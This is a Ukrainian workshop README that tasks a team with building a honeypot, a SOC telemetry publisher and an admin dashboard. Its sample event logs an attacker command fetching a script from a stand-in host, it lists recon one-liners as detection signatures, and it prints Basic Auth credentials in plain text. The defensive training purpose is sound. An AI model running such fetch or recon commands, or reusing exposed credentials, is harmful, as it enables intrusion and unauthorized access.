> **English version:** [README.en.md](README.en.md)

# Команда 1 — Пастка (Trap): мережа honeypot-сенсорів

**Ваш Lightsail:** `wic01.sanctumsec.com` (18.153.160.134)
**Ваш GitHub-репозиторій:** `https://github.com/sanctum-sec/soc-day3-trap`
**Прочитайте спочатку:** [`sanctum-sec/soc-protocol`](https://github.com/sanctum-sec/soc-protocol) — це контракт, якого ви маєте дотримуватися.

---

## 1. Ваша місія

Ви — **очі** SOC. Ваша задача: приваблювати зловмисників, фіксувати їхні дії та публікувати цю телеметрію так, щоб усі інші команди мали з чим працювати.

До кінця дня у вас буде:
- Honeypot, який приймає зʼєднання зловмисників і записує їхню поведінку
- Publisher, який перетворює кожну зафіксовану подію на `telemetry`-подію SOC Protocol
- Адмін-дашборд, де видно, що спіймано та що відбувається з *вашим* інструментом (невдалі auth-и на вашому API, спрацьовані rate limits, дивні запити)
- Нуль або одна людина, що плаче

Якщо Пастка не виробляє події — нікому далі по пайплайну нема з чим працювати. Тому ваш інструмент треба запустити першим, і першим же розблокувати, якщо інтеграція забуксувала.

---

## 2. Де це місце в реальному SOC

З Таблиці 1 «11 Strategies of a World-Class SOC» (MITRE):

- **Sensing and SOC Enclave Architecture** — ви і є сенсор.
- **Deception** — honeypot-и — це найчистіший приклад deception.
- **Custom Analytics and Detection Creation** — перший фільтр того, що вважати цікавим.

Ваш вихід — це вхід усіх інших. Реальні SOC живуть або вмирають завдяки своїм сенсорам.

---

## 3. Доступ і що вже встановлено на вашому Lightsail

```
ssh ubuntu@wic01.sanctumsec.com
# password/пароль: see https://wic-krakow.sanctumsec.com/wic-access-ghosttrace (Basic Auth: wic / stepup-krakow-2026)
```

Вже встановлено: `git`, Python 3.10 + pip, Node.js LTS, `claude`, `codex`, AWS CLI + облікові дані для `s3://wic-krakow-2026`.

Ваш SSH-ключ для GitHub Actions: якщо потрібен — згенеруйте `ssh-keygen -t ed25519 -C wic01` та передайте публічний ключ фасилітатору.

---

## 4. Потоки даних

### 4.1 Що ви виробляєте (виходи)

Події `telemetry` — одна на кожну зафіксовану взаємодію зі зловмисником. Ви POST-ите їх до:

| Кому        | Endpoint                                       | Навіщо                                                  |
| ----------- | ---------------------------------------------- | ------------------------------------------------------- |
| **Аналітик** | `http://wic03.sanctumsec.com:8000/ingest`     | Щоб вони могли корелювати та алертити.                  |
| **Розвідник** | `http://wic02.sanctumsec.com:8000/observe`  | Щоб вони збагачували спостережувані IP/хеші.            |
| **Мисливець** | `http://wic04.sanctumsec.com:8000/telemetry` | Щоб вони запускали поведінкову аналітику на сирих даних. |

Один `POST` на подію. Не батчіть — сьогодні простота важливіша.

### 4.2 Що ви споживаєте (входи)

| Від кого    | Endpoint                                         | Навіщо                                                                  |
| ----------- | ------------------------------------------------ | ----------------------------------------------------------------------- |
| **Розвідник** | `GET http://wic02.sanctumsec.com:8000/ioc/bad-ips` | Список репутації — збагачуєте свою телеметрію полем `is_known_bad: true`. |
| **Аналітик** | `POST` (вони викликають вас) `/tune`             | Опційно — пропонують «фіксуйте ось ці команди з вищим пріоритетом».     |

### 4.3 Приклад події telemetry, яку ви емітите

```json
{
  "schema_version": "1.0",
  "event_id": "<uuid>",
  "event_type": "telemetry",
  "timestamp": "2026-04-23T09:15:22Z",
  "producer": "trap",
  "severity": "low",
  "observables": {
    "source_ip": "203.0.113.42",
    "dest_ip": "18.153.160.134",
    "dest_port": 2222,
    "user": "root",
    "protocol": "ssh"
  },
  "data": {
    "honeypot_type": "ssh_low_interaction",
    "session_id": "sess-abc123",
    "events": [
      {"t": "2026-04-23T09:15:10Z", "kind": "login_attempt", "password": "123456", "outcome": "accepted"},
      {"t": "2026-04-23T09:15:15Z", "kind": "command", "value": "uname -a"},
      {"t": "2026-04-23T09:15:18Z", "kind": "command", "value": "wget http://bad.example.com/x.sh"},
      {"t": "2026-04-23T09:15:22Z", "kind": "disconnect"}
    ],
    "enrichment": {
      "is_known_bad": true,
      "scout_reputation_score": 92
    }
  }
}
```

---

## 5. Архітектура — три речі, які ви будуєте

### 5.1 Сам honeypot

Два шляхи — обирайте один або обидва, якщо встигнете:

**Шлях А (рекомендуємо — просто, швидко, достатньо):** HTTP honeypot на порті **8080**, який прикидається панеллю входу. Фейкові роути `/login`, `/admin`, `/wp-admin`, `/phpmyadmin`, які завжди відмовляють, але логують усе: source IP, user-agent, спробувані credentials, тіла запитів. Claude може сформувати каркас за 15 хвилин.

**Шлях Б (вища реалістичність):** [Cowrie](https://github.com/cowrie/cowrie) — SSH/Telnet honeypot. Встановлюєте з його GitHub, запускаєте на порті **2222**, читаєте його JSON-лог і конвертуєте кожну подію в SOC Protocol. Потребує ~1 годину, але справжніх зловмисників ви побачите за лічені хвилини після виходу на публічний IP.

**Прагматичний план:** починайте зі Шляху А. Якщо впоралися з основою до середини дня — додайте Cowrie.

### 5.2 Publisher (інтеграційний шар)

Невеликий Python-сервіс, який:
1. Читає зафіксоване зі Шляху А/Б
2. Періодично (раз на ~60с) тягне IOC-фід від Розвідника
3. Збагачує кожен запис полем `is_known_bad`, якщо source IP у списку
4. Конвертує в конверт SOC Protocol
5. POST-ить до Аналітика, Розвідника та Мисливця
6. Логує все в `~/app/logs/ops.log`, а помилки в `~/app/logs/security.log`

### 5.3 Адмін-сторінка (порт 8001)

Окрема маленька вебсторінка — Flask або FastAPI + HTMX достатньо — за HTTP Basic auth (не bearer token; використайте env-змінні `ADMIN_USER` / `ADMIN_PASS`).

Два таби:

**Operational:**
- Останні 50 зафіксованих сесій (source IP, тривалість, команди, результат)
- Статус доставки кожному peer-у (зелений/червоний per POST)
- Пропускна здатність: подій за останні 5 хв / 1 год / 24 год

**Security:**
- Невдалі вхідні auth-и (неправильний bearer token)
- Відмови через schema-валідацію (malformed events від peer-ів)
- Спрацювання rate-limit
- Вихідні POST-failures (Аналітик/Розвідник/Мисливець не відповідає)
- Підозрілі патерни проти ВАШОЇ ж адмін-сторінки

---

## 6. Рекомендований стек (не обовʼязковий)

| Компонент      | Рекомендація                                     | Чому                                                                      |
| -------------- | ------------------------------------------------ | ------------------------------------------------------------------------- |
| Мова           | **Python 3.10** (вже встановлено)                | Cowrie — на Python; pandas скрізь                                         |
| HTTP framework | **FastAPI** + Uvicorn                            | Автоматично валідує JSON через Pydantic, безкоштовна OpenAPI-документація |
| Движок honeypot | **Cowrie** (SSH) *або* самописний HTTP-trap      | Cowrie — якщо хочете реалізму; свій — якщо хочете швидкості               |
| Сховище        | **SQLite** через stdlib `sqlite3`                | Один файл, без налаштувань, pandas уміє читати                            |
| Адмін-UI       | FastAPI + Jinja-шаблони + **HTMX**               | Ніяких build-кроків, ніяких JS-фреймворків                                |
| Process manager | `systemd`                                        | Вже на Lightsail; `systemctl restart` — це ваш деплой                     |

Якщо у команді є сильний Node- чи Go-розробник — беріть те, що вона знає. Формат на дроті мовно-агностичний.

---

## 7. Security-інфраструктура — жодного компромісу

Ваш інструмент стоїть у публічному інтернеті. Справжні зловмисники вас стукнуть. Honeypot цього і *хоче* на виставлений порт. А управлінська поверхня — ні.

Мінімум (усе це, навіть під тиском часу):

- [ ] Bearer-token обовʼязковий скрізь, крім `/health` та експонованих honeypot-портів
- [ ] Pydantic (або аналог) input-валідація на кожному тілі
- [ ] Rate limiting (60 запитів/хв на source IP за замовчуванням) на `/ingest`, `/admin` та формі входу в адмінку
- [ ] HTTP Basic auth на адмін-сторінці — creds у `.env`, ніколи не комітимо
- [ ] Append-only security-лог у `~/app/logs/security.log`
- [ ] Ідемпотентність за `event_id` — дропаємо дублікати
- [ ] Ніколи не логувати bearer-токен, навіть на DEBUG-рівні

Попросіть Claude: `"add bearer-token auth middleware to this FastAPI app, checking the SOC_PROTOCOL_TOKEN env var"` і прийміть код, який він видасть. Потім: `"now add rate limiting with slowapi on /ingest — 60 requests per minute per client IP"`.

---

## 8. Специфікація адмін-сторінки

URL: `http://wic01.sanctumsec.com:8001/admin` — HTTP Basic login.

Два таби / секції. Рендер на сервері; авто-оновлення кожні 5с через HTMX.

**Таб 1 — Operational**
- Подій зафіксовано: за останні 5 хв / 1 год / 24 год (числа)
- Таблиця останніх 20 захоплень: час, source IP, який user пробували, 3 команди, результат
- Статус вихідної доставки: ✅/❌ на peer-а з часом останнього успіху
- Глибина черги (якщо додасте асинхронність)

**Таб 2 — Security**
- Останні 50 невдалих вхідних auth-ів
- Останні 50 відмов через schema-валідацію (з обрізаним payload-ом)
- Спрацювання rate-limit (source IP, endpoint, лічильник)
- Вихідні failures (peer, помилка, кількість за годину)
- Невдалі логіни в адмінку

---

## 9. Ваш день — фази з Claude

Це рекомендації, а не догма. Підлаштуйтеся під розмір і темп команди.

### Фаза 0 — Kickoff (9:15–10:00)

Усі на спільній сесії з фасилітатором з розбором протоколу. Ще не кодимо. Визначтеся: хто яку роль бере? Напишіть імена на дошці.

### Фаза 1 — Скафолд (10:00–11:00)

Мета: FastAPI-застосунок із `/health`, `/ingest` (приймає конверт) та заглушкою `/capture`, яка видає фейкові honeypot-події.

Приклади промптів до Claude (будь-яка сесія члена команди):

```
Start a FastAPI project in ~/app. Create:
- main.py with a /health GET endpoint that returns {"status":"ok","tool":"trap"}.
- /ingest POST endpoint that validates incoming JSON against a Pydantic model
  matching the event envelope in ~/app/schemas/envelope.py.
- A Pydantic model for the event envelope with required fields:
  schema_version, event_id, event_type, timestamp, producer, severity.
- A systemd unit file at ~/app/soc-app.service that runs uvicorn on port 8000.
- A requirements.txt with fastapi, uvicorn, pydantic, requests, slowapi.
Commit the initial scaffold to git with message "scaffold".
```

Пушніть у GitHub. Занесіть у репу.

### Фаза 2 — Сам honeypot (11:00–13:00)

Мета: захоплювати справжній (або реалістичний) трафік і перетворювати його на telemetry-події.

Точка рішення: **Cowrie чи свій HTTP-trap?** (Див. 5.1.) Team lead приймає рішення після 5-хвилинної дискусії.

Для свого HTTP-trap попросіть Claude:

```
Add a second FastAPI app in ~/app/trap/ running on port 8080 (no auth on this one —
it's the honeypot, attackers must be able to hit it). Implement fake /login,
/admin, /wp-admin, /phpmyadmin, /.env, /xmlrpc.php. Every request — including
its source IP, user agent, method, path, query params, body, and any credentials
tried — is logged to SQLite at ~/app/trap/captures.db in a table called `captures`.
Always return a plausible-looking failure response (401 or a generic HTML error).
Don't actually authenticate anyone.
```

Потім:

```
Write a small publisher in ~/app/publisher.py that, every 5 seconds, reads new rows
from ~/app/trap/captures.db (track a cursor by last processed rowid), converts
each into the SOC Protocol event envelope as a "telemetry" event, and POSTs to:
- http://wic03.sanctumsec.com:8000/ingest
- http://wic02.sanctumsec.com:8000/observe
- http://wic04.sanctumsec.com:8000/telemetry
Send Authorization: Bearer from the SOC_PROTOCOL_TOKEN env var.
If a peer returns non-2xx, log to ~/app/logs/security.log and keep going.
```

**Чекпоінт о 13:00** — обід. Перед виходом: закомітьте, задеплойте, зробіть `curl` на власний `/health` і `curl -X POST` на свій же `/ingest` з фейковою подією — має прийняти.

### Фаза 3 — Інтеграція (14:00–15:30)

Мета: ви продукуєте справжню телеметрію ТА споживаєте IOC-фід від Розвідника.

Попросіть Claude:

```
Add an IOC fetcher in ~/app/ioc_sync.py that every 60 seconds pulls
http://wic02.sanctumsec.com:8000/ioc/bad-ips (send bearer token) and caches the
list in memory. Modify publisher.py: before sending a telemetry event, check if
the source IP is in the cached bad-ip list, and if so, set
data.enrichment.is_known_bad = true and data.enrichment.scout_reputation_score
to whatever Scout returned.
```

Коли endpoint Розвідника ще не готовий — їхній мок має відповідати. Вони опублікують фейковий `/ioc/bad-ips` з hardcoded даними. Якщо Розвідник запізнюється з моком більш ніж на 30 хв — піднімайте на чекпоінті.

### Фаза 4 — Адмін-сторінка (15:30–17:00)

Мета: дашборд на порті 8001, два таби.

```
Create ~/app/admin/ — another FastAPI app on port 8001. Add HTTP Basic auth
with ADMIN_USER / ADMIN_PASS env vars. Render a two-tab page with HTMX
auto-refresh every 5s:
- Tab "Operational": counts of events in the last 5m/1h/24h, a table of the
  last 20 captures from captures.db, and outbound delivery status per peer.
- Tab "Security": last 50 entries from security.log, grouped by event type.
```

### Фаза 5 — Хардінг + підготовка до демо (17:00–17:30)

- Перевірте bearer: curl-ніть `/ingest` без токена — має бути `401`.
- Надішліть malformed JSON — має бути `400`.
- POST-ніть ту саму подію двічі — має бути ідемпотентно.
- Попросіть Claude: `"write 3 pytest tests covering auth failure, schema rejection, and idempotency"`.

---

## 10. Як поділити роботу між 3–5 людьми

Якщо вас **3**:

| Роль                                | Відповідає за                                     |
| ----------------------------------- | ------------------------------------------------- |
| Sensor engineer                     | Honeypot-застосунок (Шлях А або Б)                |
| Integration engineer                | Publisher, IOC sync, envelope, вихідні POST-и     |
| Ops + admin UI + deploy             | Адмін-сторінка, systemd, GitHub Actions           |

Якщо вас **4**:

| Роль                     | Відповідає за                                |
| ------------------------ | -------------------------------------------- |
| Sensor engineer          | Honeypot-застосунок                          |
| Integration engineer     | Publisher + IOC sync + envelope              |
| Admin-UI engineer        | Дашборд на порту 8001, обидва таби           |
| Ops + security + deploy  | systemd, Actions, rate limits, тести         |

Якщо вас **5**:

Поділіть «Integration» на вхідний (`/ingest`) і вихідний (publisher). Усе інше так само.

Кожна людина: **володіє одним каталогом у `~/app/`** і має власну сесію Claude. Мерж через git.

---

## 11. Чекліст «спочатку мок» (зробіть ДО всього іншого)

До 11:00 на `wic01` має бути доступно з інших команд:

- [ ] `GET /health` повертає 200 з `{"status":"ok","tool":"trap"}`
- [ ] `POST /ingest` з валідним конвертом і валідним bearer token → 200
- [ ] `POST /ingest` без токена → 401
- [ ] `GET /capture/mock` повертає заздалегідь написану фейкову telemetry-подію — щоб peer-и бачили, що ви будете емітити
- [ ] Publisher уже працює та раз на хвилину емітить фейкові події (source IP `198.51.100.1`, user `fake-attacker`) усім трьом peer-ам

Мок не мусить бути розумним. Він мусить бути. Peer-команди будуть розробляти проти цих заглушок, поки ваш справжній honeypot не живе.

---

## 12. Definition of done

**Мінімум (мусить бути до кінця дня):**
- [ ] Honeypot на порті 8080 (або Cowrie на 2222) захоплює трафік
- [ ] Publisher шле SOC Protocol telemetry до Аналітика, Розвідника, Мисливця
- [ ] IOC-збагачення від Розвідника застосовується перед відправкою
- [ ] Адмін-сторінка на порті 8001 з обома табами та робочою авторизацією
- [ ] Bearer-token auth на `/ingest`
- [ ] systemd-сервіс + GitHub Actions деплой на push у `main`

**Бонус:**
- [ ] Cowrie поряд із HTTP-trap
- [ ] Pytest-набір, що покриває auth, schema, idempotency
- [ ] Per-peer back-off + retry на вихідних фейлах
- [ ] Публічна копія захоплень у S3 для нащадків
- [ ] 30-секундне демо-відео

---

## 13. Stretch goals (якщо випереджаєте графік)

- Встановити Cowrie, впіймати реальну SSH-brute-force сесію з інтернету, показати в адмінці.
- Геолокувати source IP і відобразити на мапі світу в адмінці.
- Додати другий тип honeypot (Telnet або SMB).
- Відправляти ваші захоплення у спільний S3-бакет — для майбутніх воркшопів.

Гарного полювання.

---

## Наскрізні цілі Дня 3 (AI-CTI-теми)

На додачу до специфічних-для-команди deliverable-ів вище, **наступні три теми з програми Дня 3 (Модулі 4–6) мають помітно проявитися десь у вашому інструменті, адмін-сторінці або навчальних артефактах.** Claude Code — те, що робить це виконуваним за один день — використовуйте його.

### Ціль 1 — AI-Augmented CTI

Використайте Claude (чи будь-який LLM) для автоматизації щонайменше одного кроку CTI-циклу *всередині* вашого інструмента: extraction, classification, correlation чи enrichment threat intelligence. Це — практична реалізація Модуля 4.

### Ціль 2 — TTP та AI-enabled attack patterns

Коли мапуєте поведінку в MITRE ATT&CK, розпізнавайте також TTP, які AI-enabled зловмисник створить інакше: LLM-генерований phishing, автоматизований OSINT-driven recon, машинно-генеровані polymorphic payloads, scripted beaconing на незвичних інтервалах. Відобразіть це у ваших детекціях, гіпотезах, тегах IOC чи playbook-ах.

### Ціль 3 — AI Social Engineering (offense *та* defense)

Справжні зловмисники зараз використовують AI для масштабування phishing-у, voice-cloning, impersonation. Ваш інструмент має хоч раз цього торкнутися: захопити SE-артефакт, тегнути один, алертити на один, збагатити один — або, щонайменше, документувати, *як би* ваш інструмент реагував на AI-enabled SE-спробу.

### Як кожна ціль потрапляє у вашу роботу — специфічна для команди

- **AI-Augmented CTI:** Після захоплення кожної honeypot-сесії передавайте послідовність команд у Claude із запитом: *«Класифікуй цю сесію в одну з технік MITRE ATT&CK initial-access / execution / persistence. Confidence?»* Зберігайте класифікацію поруч із сирим захопленням. Виводьте обидва на адмін-сторінку.
- **TTP / AI attack patterns:** Додайте невеликий набір LLM-очевидних сигнатур атаки у ваші honeypot-відповіді — наприклад, token-efficient one-liner recon (`uname -a; id; cat /etc/os-release`), base64-decoded curl-патерни, clipboard-scraper payloads. Якщо сесія містить такі — тегайте її `data.ai_likely=true`.
- **AI social engineering:** На HTTP-honeypot додайте fake login endpoints, що *виглядають* як phishing-kit landing pages (`/secure-banking/login`, `/office365-update`). Логуйте надіслані creds як `data.se_attempt=true`. Додайте один приклад на Security-таб адмінки.
